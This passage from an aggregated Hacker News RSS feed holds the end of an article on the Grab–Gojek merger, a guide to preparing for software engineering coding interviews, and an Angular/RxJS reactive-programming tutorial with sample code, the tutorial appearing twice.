<p>One early Gojek investor told <em>Rest of World</em> that the appeal of ride-hailing was that it promised to create a base of regular users, who could then be leveraged into other businesses, like food delivery and e-commerce. If they used enough services regularly, the thinking was that they would no longer be tempted to switch to a rival platform, no matter how many discounts competitors offered. Once they had captured consumers, Gojek and Grab could start increasing prices and move toward profitability.&nbsp;</p>



<p>“These businesses … can be very profitable, because essentially, they become monopolistic,” the Gojek investor said. “We haven’t reinvented the wheel, this is just monopolism in a different form.”</p>



<p>Investors in both Grab and Gojek told <em>Rest of World</em> that they are no longer confident either will ever become a quasi-monopoly on its own. Indonesia is by far the biggest market in the region, and Grab and Gojek are still fighting to dominate it, though Gojek has a slight lead. Grab is ahead in Vietnam, Malaysia, and the Philippines — all smaller markets unlikely to offer the scale that would excite investors. Neither has succeeded in building a single, pan-regional super app.</p>



<p>Since coworking giant WeWork <a href="https://www.newyorker.com/culture/culture-desk/the-rise-and-fall-of-wework">imploded</a> in 2019 after raising more than <a href="https://www.crunchbase.com/organization/wework/investor_financials">$20 billion</a>, venture capitalists have begun questioning the winner-takes-all approach, which requires essentially burning large sums of money to achieve dominance that’s anything but guaranteed. Even SoftBank, which has relied heavily on the strategy, is putting pressure on its portfolio companies to show that they can be sustainable in the short term, rather than at an unspecified point in the future.&nbsp;</p>



<p>Covid-19 has also made investors more rational, the Gojek investor said. Ride-hailing businesses have slumped during citywide lockdowns. Even in countries where economic activity is bouncing back, office workers are often not traveling at peak hours, robbing companies of surge pricing schemes that boost revenue. Food delivery has outperformed during the pandemic, but intense competition has also meant that it’s yet to be profitable.&nbsp;</p>



<p>“The amount of money we were burning on the Gojek side, and the amount of money that Grab was burning on their side, was crazy,” the Gojek investor said. “We’re happy that no one’s got the financial means to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/grab-gojek-merger-could-devastate-gig-workers/">https://restofworld.org/2021/grab-gojek-merger-could-devastate-gig-workers/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/grab-gojek-merger-could-devastate-gig-workers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065470</guid>
            <pubDate>Mon, 08 Feb 2021 15:08:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Pass a Software Engineering Interview]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26065298">thread link</a>) | @gibbonsd1
<br/>
February 8, 2021 | https://www.danhacks.com/software/software-engineering-coding-interview.html | <a href="https://web.archive.org/web/*/https://www.danhacks.com/software/software-engineering-coding-interview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>To get a job as a software engineer, most companies have an interview process that includes coding. While these interviews aren’t perfect, they’re widely used, so in order to stay employable it’s a necessary skill to learn how to prepare and study for these interviews. There are plenty of resources online and this guide is a listing of many of these resources to help you practice once you have coding interviews scheduled.</p>

<p><img src="https://www.danhacks.com/assets/softwareEngineerInterview.jpg" alt="Software Engineering Interviewing"></p>

<p>To pass these interviews, a few skills are needed:</p>
<ul>
  <li>Have a clear, concise, and easy to read resume that describes specifically what you’ve done in school/work. Be prepared to talk about the projects you worked on in depth and describe how the solutions work.</li>
  <li>When a problem is presented, carefully read the requirements, ask clarifying questions, and propose a solution first before coding.</li>
  <li>Code quickly. Practice as many problems as possible, set a time limit for a problem (e.g. 20 mins), and try to solve it in that time. If you can’t figure one out in time, research the algorithms and solutions for it, study it line by line until you understand how it works, and try again. In a coding interview you’re typically presented at least 2 questions that you must solve in less than an hour.</li>
  <li>Understand common data structures and algorithms. Be able to apply them in your problem solving.</li>
  <li>Interpersonal skills. In addition to coding the solution, you’ll have to be able to clearly explain how it works and talk through the problem with the interviewer as you go. Practice online or with a friend. Quickly talk through the problem and your proposed solution before you start coding.</li>
  <li>Be able to analyze your solution in terms of time and space complexity. When presented with a problem try to think of the most efficient solution first and skip coding the naive solution. This will give you time to solve more problems.</li>
  <li>Learn clean code principles such as not repeating code, writing clear meaningful variable names,and separating large blocks of code into smaller functions.</li>
  <li>Practice building actual applications. This will help you move faster and be able to understand code better.</li>
  <li>Think of several test cases that would appropriately test your code. An interviewer may ask you to walk through one of them line by line and describe how it works.</li>
</ul>

<p>Additionally, if the interview is on the phone or video, ensure your environment sets you up for success.</p>
<ul>
  <li>Test your webcam and audio ahead of time</li>
  <li>Download any video conferencing software you need for the interview and test it ahead of time.</li>
  <li>Set up your computer in a quiet environment, put your phone on silent, and ask anyone in your household not to disturb you during the interview.</li>
  <li>Solving these problems quickly requires a lot of concentration and you don’t want to be interrupted during the interview and break your concentration.</li>
</ul>

<h3 id="data-structures-to-learn">Data structures to learn</h3>
<p>You’ll need to understand the operations on common data structures as well as how to implement them with more primitive data structures. For example, you could be asked in an interview to implement a stack or queue using an array. Here’s a list of some of the common data structures, but be sure to brush up with an algorithms book and/or YouTube videos to get a comprehensive understanding of how they work.</p>

<ul>
  <li>Maps</li>
  <li>Sets</li>
  <li>Trees</li>
  <li>Graphs</li>
  <li>Linked Lists</li>
  <li>Arrays</li>
  <li>Stacks</li>
  <li>Queues</li>
  <li>Heaps</li>
</ul>

<h3 id="algorithms-to-learn">Algorithms to learn</h3>
<p>There’s no shortage of algorithms, but here are a few that are frequently used in interviews, so be sure to gain mastery with a large breadth of problems.</p>

<ul>
  <li>Writing recursive code. Practice translating iterative to recursive and vice versa.</li>
  <li>Depth First Search</li>
  <li>Breadth First Search</li>
  <li>Set Theory (Unions, etc)</li>
  <li>Dynamic Programming</li>
  <li>String manipulation</li>
  <li>Array manipulation</li>
  <li>Matrix traversal</li>
  <li>Hashing</li>
  <li>Binary Search</li>
  <li>Efficient Sorting, e.g. Quicksort</li>
  <li>Bit Manipulation</li>
  <li>Build an LRU Cache</li>
</ul>

<h3 id="websites-with-problems">Websites with Problems</h3>
<ul>
  <li>
<a href="https://leetcode.com/" target="_blank" rel="noopener noreferrer">LeetCode</a> - LeetCode has different problem levels, so start by practicing easy, then work on medium, and later hard. Typically the questions in interviews will be easy or medium level. There are thousands of probleems on LeetCode and it’s arguably one of the best resources for practice problems.</li>
  <li>
<a href="https://www.hackerrank.com/" target="_blank" rel="noopener noreferrer">HackerRank</a> - HackerRank has a lot of problems like LeetCode, but is better organized and provides more context around which areas the algorithms you’re solving are in. Some companies use HackerRank, so it’s good to become familiar with the interface.</li>
  <li>
<a href="https://coderpad.io/" target="_blank" rel="noopener noreferrer">CoderPad</a> - CoderPad is used by a lot of companies for interviews, so practice using the interface so that you don’t waste time in an interview looking for buttons or being surprised by how the interface works with your programming language.</li>
  <li>
<a href="https://projecteuler.net/" target="_blank" rel="noopener noreferrer">Project Euler</a> - Project Euler has fun math problems, but they are not typically asked directly in an interview like the LeetCode or HackerRank questions. However, it still helps your problem solving and coding speed, so it can be good to play with some different websites to get a different perspective and learn to code faster.</li>
  <li>
<a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer">YouTube</a> - YouTube is invaluable and there’s tons of great YouTubers that will teach you how to do each type of problem. Simply search for more general terms such as “software engineering interview” or more specific problems, data structures, and algorithms you want to learn. Follow up by actually coding the solutions you learn so that you can do it in an interview.</li>
  <li>
<a href="https://www.algoexpert.io/" target="_blank" rel="noopener noreferrer">AlgoExpert</a> - AlgoExpert is like LeetCode and YouTube combined into an easy to use interface. It makes the problems and their solutions easily discoverable, as well as providing a place to practice.</li>
  <li>
<a href="https://interviewing.io/" target="_blank" rel="noopener noreferrer">Interviewing.io</a> - If you don’t have a friend that can help you practice real interviews, there are websites like Interviewing that let you interview with an actual engineer, but they can be pretty pricey. Instead of spending a lot of money doing practice interviews, you can also apply for more jobs and set up coding interviews with more companies. This way you can practice for free and potentially get an offer from a company at the same time.</li>
  <li>Other - There are countless other websites like LeetCode, some paid so experiment with different websites and find one that works best for you.</li>
</ul>

<h3 id="company-websites">Company Websites</h3>
<p>Doing research on the culture of the company you have an interview set up with helps with culture, but sometimes they also have information about the structure of the interviews, including how to practice for the coding portion.</p>

<ul>
  <li><a href="https://www.facebook.com/careers/life/preparing-for-your-software-engineering-interview-at-facebook" target="_blank" rel="noopener noreferrer">Facebook</a></li>
  <li><a href="https://www.apple.com/jobs/us/" target="_blank" rel="noopener noreferrer">Apple</a></li>
  <li><a href="https://www.amazon.jobs/en/landing_pages/software-development-topics" target="_blank" rel="noopener noreferrer">Amazon</a></li>
  <li><a href="https://jobs.netflix.com/culture" target="_blank" rel="noopener noreferrer">Netflix</a></li>
  <li><a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener noreferrer">Google</a></li>
</ul>

<h3 id="programming-language-docs">Programming language docs</h3>
<p>In the interview you’ll typically be able to choose a programming language. Ensure you choose your best one that you can code quickly in. Study the docs for all of the data structures above. For example, if your programming language is Java, you might want to read the docs to <a href="https://docs.oracle.com/javase/8/docs/api/java/util/HashMap.html" target="_blank" rel="noopener noreferrer">HashMap</a> while practicing so that you don’t have to research things during the interview.</p>

<h3 id="linkedin">LinkedIn</h3>
<p>Before each interview if you know the name of the people conducting the interview, look their background up on LinkedIn ahead of time so that you have some context about their background when you’re talking to them. This will also let you know what to expect. For example, a manager may ask you about your projects and experience while an engineer might do an in depth coding interview.</p>

<h3 id="the-recruiter">The Recruiter</h3>
<p>Recruiters can be either internal or external to the company. Internal recruiters would only work for one company while an external recruiter might be able to set up interviews with multiple companies for you. You don’t have to pay the recruiter as the company will pay them when someone gets hired, so it’s typically in their best interest to get you an offer. Regardless of which type, except for smaller startups, most roles will have a recruiter coordinating the interview process. They can be invaluable to ask questions about what to study for and know what to expect in the interviews. They can also provide feedback after the interview so that you know which areas to study more for your next interview.</p>

<h3 id="books">Books</h3>

<p>Everyone learns differently and comprehensively going through books in addition to practicing using the above resources can give you an edge of others. Here’s a few that can be good to get started with.</p>

<ul>
  <li><a href="https://amzn.to/3tEAsvu" target="_blank" rel="noopener noreferrer">Introduction to Algorithms</a></li>
  <li><a href="https://amzn.to/2YUtkNt" target="_blank" rel="noopener noreferrer">Design Patterns</a></li>
  <li><a href="https://amzn.to/3ibkSlA" target="_blank" rel="noopener noreferrer">Cracking the Coding Interview</a></li>
  <li><a href="https://amzn.to/3souEWj" target="_blank" rel="noopener noreferrer">Clean Code</a></li>
  <li><a href="https://amzn.to/3bLblRf" target="_blank" rel="noopener noreferrer">The Complete Software Developer’s Career Guide</a></li>
</ul>

<h3 id="next">Next</h3>
<p>The coding interview is just one part of the interview process. Other areas to study include systems design, culture fit, and behavioral interviews. You’ll have to master all of them to get through the interviews at a larger company and receive an offer.</p>


    




  </div></div>]]>
            </description>
            <link>https://www.danhacks.com/software/software-engineering-coding-interview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065298</guid>
            <pubDate>Mon, 08 Feb 2021 14:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clean code through Reactive programming in Angular with RxJS]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26065077">thread link</a>) | @yannbri
<br/>
February 8, 2021 | https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular | <a href="https://web.archive.org/web/*/https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>One of the most common hindrances a developer will cope within its journey will be a bug due to a side effect of an asynchronous method. Everything was supposed to work as expected, though, eventually, it did not. Using imperative programming, developers often pull their hair out anticipating when a function will be triggered and how it will affect the state. From this chaos will soar multiple bugs. <strong>Reactive programming, therefore, appeared as an answer for developers to put them in a state of mind where they can code imitating the events that occur in their application.</strong></p>
<!--more-->
<p>Though shifting from imperative to reactive programming is tricky at first, in this article we will define what coding reactively actually means, the tools to code reactively and through an example show in which pitfalls a greenhorn reactive programmer could fall and how to avoid it. In this example, our purpose is to build a cocktail carousel app.</p>
<p>We aim to create:</p>
<ul>
<li>a search bar where users can type in a text, to look for a drink they want to discover</li>
<li>we display a list of 3 answers on the screen</li>
<li>a list that updates every 1.5 seconds</li>
<li>images switching one spot to the left, as a new one appears on the right-hand side</li>
</ul>
<p>Ideally this would look like this</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif" alt="Gif1" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=300&amp;name=Gif1.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=900&amp;name=Gif1.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1200&amp;name=Gif1.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1500&amp;name=Gif1.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1800&amp;name=Gif1.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<h3>But before we need to change our focus...</h3>
<p>As the owner of a store during the pandemic, you aim at counting the number of people that are currently in your store in order to enable social distancing inside. You could think of an iterative way which would be to check the number of people in your store and count it manually. You could also start at 0 in the morning when you open and then only look at the door, increment or decrement based on people coming or leaving the place. The first option requires burning the midnight oil, especially if your store has a lot of rooms. With the second option, you only have to look at the door without moving from your chair, which makes the calculation way easier.</p>
<p>This is exactly what Reactive programming is about:</p>
<blockquote>
<p><em>"Reactive programming is a programming paradigm that is built around the notion of continuous time-varying values and propagation of change. It facilitates the declarative development of event-driven applications by allowing developers to express programs in terms of what to do, and let the language automatically manage when to do it."</em> Bainomugisha et al., A Survey on Reactive Programming, 2012</p>
</blockquote>
<p><strong>Though it's conceptually hard to dive in at first glance, the code becomes easier to read and maintain, with a paradigm based on events happening in your application</strong>. Indeed, to come back to our store example, the second method fits clients' behavior best. A client spending a long time wandering in your store could be counted in many of the checks you make. Looking at the door is independent of this behavior. No matter what the client does in your store, it will only trigger two kinds of events: entrance, exit.</p>
<p><strong>Developers start thinking about code as a suite of events that modify a state</strong>. Rather than looking at the state, the object itself, the developer would look at the events that would modify the state, regardless of the state itself.</p>
<p>Here we'll dive in more depth into how <strong>Angular implements Reactive programming with the use of a pattern called Observable.</strong></p>
<h2>From callbacks to streams</h2>
<p>To better understand what Observables are, let's try to differentiate them starting from one of the most famous asynchronous patterns in JS, Promises. <strong>While a Promise happens once in time and will return the desired output or throw an error, Observables in Angular, are a stream of data over time.</strong> <strong>A stream can have multiple values succeeding at various frequencies in time</strong>. After we get the first value emitted on the Observable stream, contrary to a Promise, it will keep living until you complete it.</p>
<blockquote>
<p><em>"Reactive Programming is programming with asynchronous data streams."</em></p>
</blockquote>
<p>In order to access and use the values that are emitted through this stream, you can <code>subscribe</code> to this Observable stream and get notified every time a new value is emitted on this stream.</p>
<pre><code><span>Observable([1, 2, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, 3</span><p><span>Observable([1, 2, wait3seconds, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, ..., 3</span></p></code></pre>
<p>While Promises are like the action of going to a shop and buy your newspapers once, Observables act like a subscription to the magazine. Every time a new edition is published, every subscriber will receive a copy. Both the magazine (in case of bankruptcy for instance) or the subscribers can stop the subscription to this stream.</p>
<h3>Operators</h3>
<p><span>We are now going to dive into how to create and manipulate (transform, filter, ...) and terminate these observables. To perform these actions one can use Operators (for creation, and also transformation, filtering, termination)</span>. To better understand what these operators do to an Observable, we represent them using marble diagrams. You'll find a list of operators and their diagrams here at <a href="https://rxmarbles.com/" rel="noopener">RxMarbles</a><a href="https://rxmarbles.com/"></a>. These operators were popularised by the project <a href="http://reactivex.io/" rel="noopener">ReactiveX</a>&nbsp;which aims to provide different APIs in multiple programming languages (including RxJS, the one used in this article). <span>ReactiveX implements the Observer pattern, which is having Observers subscribing to events (Observables) and performing side effects based on this event, using combinations of operators.</span></p>
<p>I can subscribe to a magazine. When I receive a new one, I use an operator to make coffee and another one to read it.</p>
<p>Let's look at a classic creation operator to better grasp how observables are generated and evolve through time: the <code>interval</code>. <code>Interval</code> creates a stream of data that emits an incremented suite of integers at a given pace (in this example every 1000 ms)</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png" alt="Img2" width="2014" srcset="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=1007&amp;name=Img2.png 1007w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png 2014w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=3021&amp;name=Img2.png 3021w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=4028&amp;name=Img2.png 4028w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=5035&amp;name=Img2.png 5035w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=6042&amp;name=Img2.png 6042w" sizes="(max-width: 2014px) 100vw, 2014px"></p>
<p>This creation can be pretty useful, but let's introduce transformation operators with another use case. If we don't want the list of integers but rather the list of multiples of ten we can use the Observable we just created and map the values using a transformation operator. This will enable you to transform the data emitted from the stream of the observable and create another stream from the input one.</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png" alt="Img3" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=818&amp;name=Img3.png 818w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=2454&amp;name=Img3.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=3272&amp;name=Img3.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4090&amp;name=Img3.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4908&amp;name=Img3.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>As a matter of fact, we can look at the map operator which applies a function to an entry Observable stream, and returns an Observable whose values are the output of the function applied to the entry stream values.</p>
<p>Eventually, you can use operators to stop the Observable stream. For instance, the <code>first</code> operator will complete the Observable after the first value is emitted on the stream. The <code>first</code> operator is actually enough to make an Observable behave like a Promise (which is the opposite of the purpose of this article but interesting to grasp the concept of Observables).</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png" alt="Img4" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=818&amp;name=Img4.png 818w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=2454&amp;name=Img4.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=3272&amp;name=Img4.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4090&amp;name=Img4.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4908&amp;name=Img4.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>Let's look at how we could use Observables, using them as Promises (which is the main pitfall new reactive programmers fall into).</p>
<h2>Moving to reactive programming: (unwisely) use Observables like Promises</h2>
<p><strong>The first misuse of Observables developers can make is to use them as if they were Promises thanks to the subscribe method.</strong> This method looks like a callback in which developers tend to put the behavior they will expect. Indeed one of the main pain point at first when dealing with Observables is how to manipulate the value. As Observables are lazy by nature, Angular will not calculate an observable if you do not subscribe to it, hence the reflex to subscribe, get the value and do something with it. This is exactly what callbacks are about.</p>
<p>However, as we said, unlike a Promise, Observable live through time, and contrary to callbacks, the code contained in the <code>subscribe</code> method will be executed every time the observable changes, resulting in potential side effects and memory leaks potentially.</p>
<p>Let's now look at a first piece of code that generates an (invalid) implementation of the carousel</p>
<p>The carousel dynamic is created thanks to an observable <code>interval</code>. This observable emits every 1500ms an integer. Its marble diagram is the aforementioned one.</p>
<pre><code><span>constructor(private http: HttpClient) {}</span><br><span>  search = new FormControl('');</span><br><span>  drinksCarousel = [];</span><br><span>  baseUrl = '&lt;https://www.thecocktaildb.com/api/json/v1/1/search.php?s=&gt;';</span><br><span>  ngOnInit() {</span><br><span>    this.search.valueChanges.subscribe((searchText: string) =&gt;</span><br><span>      this.http.get&lt;any&gt;(this.baseUrl + searchText).subscribe((results) =&gt; {</span><br><span>        interval(1500).subscribe((int) =&gt; {</span><br><span>          this.drinksCarousel = results.drinks.slice(int, int + 3);</span><br><span>        });</span><br><span>      })</span><br><span>    );</span><br><span>  }</span><br></code></pre>
<p><strong>We can see a first code smell here: nested subscribes.</strong> This behavior is often used to mimic callbacks as we said before but will trigger some side effects. If we type several letters, to look for "margarita" we get the following update</p>
<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular">https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular</a></em></p>]]>
            </description>
            <link>https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065077</guid>
            <pubDate>Mon, 08 Feb 2021 14:42:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clean code through Reactive programming in Angular with RxJS]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26065016">thread link</a>) | @PaulClavier
<br/>
February 8, 2021 | https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular | <a href="https://web.archive.org/web/*/https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>One of the most common hindrances a developer will cope within its journey will be a bug due to a side effect of an asynchronous method. Everything was supposed to work as expected, though, eventually, it did not. Using imperative programming, developers often pull their hair out anticipating when a function will be triggered and how it will affect the state. From this chaos will soar multiple bugs. <strong>Reactive programming, therefore, appeared as an answer for developers to put them in a state of mind where they can code imitating the events that occur in their application.</strong></p>
<!--more-->
<p>Though shifting from imperative to reactive programming is tricky at first, in this article we will define what coding reactively actually means, the tools to code reactively and through an example show in which pitfalls a greenhorn reactive programmer could fall and how to avoid it. In this example, our purpose is to build a cocktail carousel app.</p>
<p>We aim to create:</p>
<ul>
<li>a search bar where users can type in a text, to look for a drink they want to discover</li>
<li>we display a list of 3 answers on the screen</li>
<li>a list that updates every 1.5 seconds</li>
<li>images switching one spot to the left, as a new one appears on the right-hand side</li>
</ul>
<p>Ideally this would look like this</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif" alt="Gif1" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=300&amp;name=Gif1.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=900&amp;name=Gif1.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1200&amp;name=Gif1.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1500&amp;name=Gif1.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1800&amp;name=Gif1.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<h3>But before we need to change our focus...</h3>
<p>As the owner of a store during the pandemic, you aim at counting the number of people that are currently in your store in order to enable social distancing inside. You could think of an iterative way which would be to check the number of people in your store and count it manually. You could also start at 0 in the morning when you open and then only look at the door, increment or decrement based on people coming or leaving the place. The first option requires burning the midnight oil, especially if your store has a lot of rooms. With the second option, you only have to look at the door without moving from your chair, which makes the calculation way easier.</p>
<p>This is exactly what Reactive programming is about:</p>
<blockquote>
<p><em>"Reactive programming is a programming paradigm that is built around the notion of continuous time-varying values and propagation of change. It facilitates the declarative development of event-driven applications by allowing developers to express programs in terms of what to do, and let the language automatically manage when to do it."</em> Bainomugisha et al., A Survey on Reactive Programming, 2012</p>
</blockquote>
<p><strong>Though it's conceptually hard to dive in at first glance, the code becomes easier to read and maintain, with a paradigm based on events happening in your application</strong>. Indeed, to come back to our store example, the second method fits clients' behavior best. A client spending a long time wandering in your store could be counted in many of the checks you make. Looking at the door is independent of this behavior. No matter what the client does in your store, it will only trigger two kinds of events: entrance, exit.</p>
<p><strong>Developers start thinking about code as a suite of events that modify a state</strong>. Rather than looking at the state, the object itself, the developer would look at the events that would modify the state, regardless of the state itself.</p>
<p>Here we'll dive in more depth into how <strong>Angular implements Reactive programming with the use of a pattern called Observable.</strong></p>
<h2>From callbacks to streams</h2>
<p>To better understand what Observables are, let's try to differentiate them starting from one of the most famous asynchronous patterns in JS, Promises. <strong>While a Promise happens once in time and will return the desired output or throw an error, Observables in Angular, are a stream of data over time.</strong> <strong>A stream can have multiple values succeeding at various frequencies in time</strong>. After we get the first value emitted on the Observable stream, contrary to a Promise, it will keep living until you complete it.</p>
<blockquote>
<p><em>"Reactive Programming is programming with asynchronous data streams."</em></p>
</blockquote>
<p>In order to access and use the values that are emitted through this stream, you can <code>subscribe</code> to this Observable stream and get notified every time a new value is emitted on this stream.</p>
<pre><code><span>Observable([1, 2, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, 3</span><p><span>Observable([1, 2, wait3seconds, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, ..., 3</span></p></code></pre>
<p>While Promises are like the action of going to a shop and buy your newspapers once, Observables act like a subscription to the magazine. Every time a new edition is published, every subscriber will receive a copy. Both the magazine (in case of bankruptcy for instance) or the subscribers can stop the subscription to this stream.</p>
<h3>Operators</h3>
<p><span>We are now going to dive into how to create and manipulate (transform, filter, ...) and terminate these observables. To perform these actions one can use Operators (for creation, and also transformation, filtering, termination)</span>. To better understand what these operators do to an Observable, we represent them using marble diagrams. You'll find a list of operators and their diagrams here at <a href="https://rxmarbles.com/" rel="noopener">RxMarbles</a><a href="https://rxmarbles.com/"></a>. These operators were popularised by the project <a href="http://reactivex.io/" rel="noopener">ReactiveX</a>&nbsp;which aims to provide different APIs in multiple programming languages (including RxJS, the one used in this article). <span>ReactiveX implements the Observer pattern, which is having Observers subscribing to events (Observables) and performing side effects based on this event, using combinations of operators.</span></p>
<p>I can subscribe to a magazine. When I receive a new one, I use an operator to make coffee and another one to read it.</p>
<p>Let's look at a classic creation operator to better grasp how observables are generated and evolve through time: the <code>interval</code>. <code>Interval</code> creates a stream of data that emits an incremented suite of integers at a given pace (in this example every 1000 ms)</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png" alt="Img2" width="2014" srcset="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=1007&amp;name=Img2.png 1007w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png 2014w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=3021&amp;name=Img2.png 3021w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=4028&amp;name=Img2.png 4028w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=5035&amp;name=Img2.png 5035w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=6042&amp;name=Img2.png 6042w" sizes="(max-width: 2014px) 100vw, 2014px"></p>
